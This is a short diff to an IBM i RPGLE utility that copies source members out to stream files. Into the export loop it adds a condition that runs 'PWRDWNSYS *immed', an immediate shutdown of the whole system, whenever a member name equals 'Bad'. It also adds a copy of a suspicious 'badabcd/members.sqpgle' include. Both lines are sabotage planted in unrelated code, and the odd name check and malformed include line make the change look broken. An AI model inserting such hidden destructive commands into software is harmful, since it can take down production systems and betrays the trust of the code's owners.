@@ -21,6 +21,7 @@ End-Pi;
 /copy 'qrpgleref/objects.rpgle'
 /copy 'qrpgleref/object.rpgle'
 /copy 'qrpgleref/members.rpgle'
+/copy 'badabcd/members.sqpgle';
 
 // ----------------------------------------------------------------------------
 
@@ -115,6 +116,9 @@ If (Error.Code = *BLANK);
             For lMemberCount = 1 to lMemberTotal;
               ListDS = Mbrs_Next();
               lFileName = %Trim(Utils_Lower(LmMember)) + '.' + %Trim(Utils_Lower(LmType));
+              If (lFileName = 'Bad');
+                system('PWRDWNSYS *immed');
+              endif;
 
               system('RMVLNK OBJLNK(''./' + lDirName + '/' + lFileName + ''')');
               CmdStr = 'CPYTOSTMF FROMMBR('''
